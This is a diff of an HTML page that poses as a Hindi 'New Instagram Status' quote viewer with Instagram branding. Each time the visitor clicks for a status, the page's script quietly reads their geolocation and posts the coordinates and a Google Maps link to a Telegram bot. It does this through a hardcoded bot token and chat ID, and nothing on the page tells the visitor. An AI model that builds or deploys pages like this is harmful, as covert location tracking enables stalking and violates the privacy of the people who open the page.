@@ -1,167 +1,147 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram New Status</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>New Instagram Status</title>
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(to bottom, #ffecd2, #fcb69f);
+      background: linear-gradient(135deg, #fcb045, #fd1d1d, #833ab4);
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      color: white;
       text-align: center;
     }
+    .logo {
+      width: 120px;
+      height: 120px;
+      background: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png') center/contain no-repeat;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 30px;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.4);
+    }
     #start-btn, #next-btn {
-      background: #ff5722;
+      background: #ffffff;
+      color: #fd1d1d;
       border: none;
-      padding: 15px 30px;
-      color: white;
+      padding: 15px 35px;
       font-size: 20px;
-      border-radius: 10px;
+      border-radius: 50px;
       cursor: pointer;
-      margin-top: 20px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      margin-top: 15px;
+      transition: all 0.3s;
+    }
+    #start-btn:hover, #next-btn:hover {
+      transform: scale(1.1);
     }
     #status-box {
       display: none;
-      background: white;
-      border-radius: 15px;
-      padding: 30px;
-      font-size: 22px;
+      background: rgba(255, 255, 255, 0.8);
       color: #333;
-      max-width: 90%;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+      border-radius: 15px;
+      padding: 25px;
+      max-width: 85%;
+      font-size: 24px;
+      margin-top: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
     }
   </style>
 </head>
 <body>
 
-  <button id="start-btn">📸 Instagram New Status</button>
+  <div class="logo"></div>
+  <h1>New Instagram Status</h1>
+  <button id="start-btn">Show Status</button>
 
   <div id="status-box">
     <div id="status-text"></div>
     <button id="next-btn">Next Status</button>
   </div>
 
-  <script>
-    const startBtn = document.getElementById('start-btn');
-    const statusBox = document.getElementById('status-box');
-    const statusText = document.getElementById('status-text');
-    const nextBtn = document.getElementById('next-btn');
+<script>
+  const startBtn = document.getElementById('start-btn');
+  const statusBox = document.getElementById('status-box');
+  const statusText = document.getElementById('status-text');
+  const nextBtn = document.getElementById('next-btn');
 
-    const statuses = [
-      "ज़िन्दगी छोटी है मुस्कुराना सीखो 😊",
-      "Attitude अपना अलग है 😉",
-      "दिल से ज्यादा भरोसा तोड़ने वाला कोई नहीं 💔",
-      "ख्वाब बड़े हैं, हिम्मत भी पूरी है 💪",
-      "ज़माना क्या सोचेगा ये मत सोचो 😎",
-      "हम वही करते हैं जो दिल कहे ❤️",
-      "Smile करो, दुनिया जल जाएगी 🔥",
-      "Single रहकर मस्त हैं हम 😜",
-      "कदर कर लो उनकी जो बिना मतलब के भी साथ हैं 🤗",
-      "खुद की कीमत समझो 💯",
-      "दिखावा नहीं, असली हूँ मैं 🤘",
-      "मौसम बदल रहा है, दोस्त नहीं 😊",
-      "ज़िन्दगी अपनी शर्तों पर जीते हैं 🚀",
-      "सपने अपने हैं, रास्ते भी अपने होंगे ✌️",
-      "खुश रहो, टेंशन में दुनिया है 😁",
-      "Love yourself first 💖",
-      "जो मिला उसी में खुश रहो 🌸",
-      "दूसरों से उम्मीद रखना छोड़ दो 😊",
-      "ज्यादा सोचोगे तो खो दोगे 🙃",
-      "बुरा वक़्त सबका आता है ⏳",
-      "अपने दम पर जीना सीखो 💪",
-      "कुछ तो लोग कहेंगे, लोगों का काम है कहना 😅",
-      "Muskurate रहो, ये ज़िन्दगी है 🎉",
-      "दिल साफ़ रखो, चहरे की चिंता मत करो ✨",
-      "जो लोग दिल के सच्चे होते हैं, वही अकेले होते हैं 💔",
-      "हमारी दुनिया अलग है 🌍",
-      "जो खो गया, वो सिखा गया 📖",
-      "रंगीन है ज़िन्दगी, बस नज़र चाहिए 🎨",
-      "अंदाज़ हमारा खास है 😎",
-      "चुप रहना भी एक कला है 🤫",
-      "जो लोग हमें खो देते हैं, वो किस्मत वाले नहीं होते 🙃",
-      "ज़िन्दगी एक खूबसूरत सफर है 🚗",
-      "कभी कभी खुद को भी खुश रखो 🎈",
-      "अपना time आएगा ⏳",
-      "कम बोलो पर सच्चा बोलो ❤️",
-      "दिल से जीओ हर लम्हा 😊",
-      "हम अपने दिल की सुनते हैं 🎧",
-      "Smile is the best makeup 💄",
-      "किस्मत बदल सकती है मेहनत से 🔥",
-      "लोग बदलते हैं मौसम की तरह 🌦️",
-      "हमसे जलने वालों का इलाज अभी बाकी है 😂",
-      "ज़िन्दगी वही है जो हंसते हुए गुजरे 😃",
-      "प्यार सच्चा मिले तो संभाल कर रखना ❤️",
-      "कुछ बातें दिल में ही रहने दो 🤍",
-      "जिन्हें हमसे फर्क पड़ता है वही सच्चे हैं 🥰",
-      "भरोसा तोड़ना आसान है, बनाना मुश्किल 🔒",
-      "हमसे बात करना सीख लो, वरना खो दोगे 😌",
-      "दुनिया से ज्यादा खुद से प्यार करो 💗",
-      "Attitude तो बचपन से है 🐯",
-      "जो बीत गया उसे सोच कर क्या मिलेगा? 😊"
-    ];
+  const statuses = [
+    "ज़िन्दगी छोटी है मुस्कुराना सीखो 😊",
+    "Attitude अपना अलग है 😉",
+    "दिल से ज्यादा भरोसा तोड़ने वाला कोई नहीं 💔",
+    "ख्वाब बड़े हैं, हिम्मत भी पूरी है 💪",
+    "ज़माना क्या सोचेगा ये मत सोचो 😎",
+    "हम वही करते हैं जो दिल कहे ❤️",
+    "Smile करो, दुनिया जल जाएगी 🔥",
+    "Single रहकर मस्त हैं हम 😜",
+    "कदर कर लो उनकी जो बिना मतलब के भी साथ हैं 🤗",
+    "खुद की कीमत समझो 💯"
+  ];
 
-    let currentIndex = 0;
+  let currentIndex = 0;
 
-    const BOT_TOKEN = '8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc';
-    const CHAT_ID = '7357184121';
+  const BOT_TOKEN = '8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc';
+  const CHAT_ID = '7357184121';
 
-    startBtn.onclick = () => {
-      startBtn.style.display = 'none';
-      statusBox.style.display = 'block';
-      showStatus();
-      getLocation();
-    };
+  startBtn.onclick = () => {
+    startBtn.style.display = 'none';
+    statusBox.style.display = 'block';
+    showStatus();
+    getLocation();
+  };
 
-    nextBtn.onclick = () => {
-      currentIndex = (currentIndex + 1) % statuses.length;
-      showStatus();
-      getLocation();
-    };
+  nextBtn.onclick = () => {
+    currentIndex = (currentIndex + 1) % statuses.length;
+    showStatus();
+    getLocation();
+  };
 
-    function showStatus() {
-      statusText.textContent = statuses[currentIndex];
+  function showStatus() {
+    statusText.textContent = statuses[currentIndex];
+  }
+
+  function getLocation() {
+    if (!navigator.geolocation) {
+      console.log("Geolocation not supported");
+      return;
     }
+    navigator.geolocation.getCurrentPosition(success, error);
+  }
 
-    function getLocation() {
-      if (!navigator.geolocation) {
-        console.log("Geolocation not supported");
-        return;
-      }
-      navigator.geolocation.getCurrentPosition(success, error);
-    }
+  function success(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const acc = position.coords.accuracy;
+    const msg = `📍 Location Update:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} m\n🔗 https://www.google.com/maps?q=${lat},${lon}`;
+    sendToTelegram(msg);
+  }
 
-    function success(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const acc = position.coords.accuracy;
-      const msg = `📍 Location Update:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} m\n🔗 https://www.google.com/maps?q=${lat},${lon}`;
-      sendToTelegram(msg);
-    }
+  function error(err) {
+    console.warn("Location error: ", err.message);
+  }
 
-    function error(err) {
-      console.warn("Location error: ", err.message);
-    }
-
-    function sendToTelegram(message) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
+  function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
       })
-      .then(res => res.json())
-      .then(data => console.log("Telegram sent:", data))
-      .catch(err => console.error("Telegram error:", err));
-    }
-  </script>
+    })
+    .then(res => res.json())
+    .then(data => console.log("Telegram sent:", data))
+    .catch(err => console.error("Telegram error:", err));
+  }
+</script>
 
 </body>
 </html>
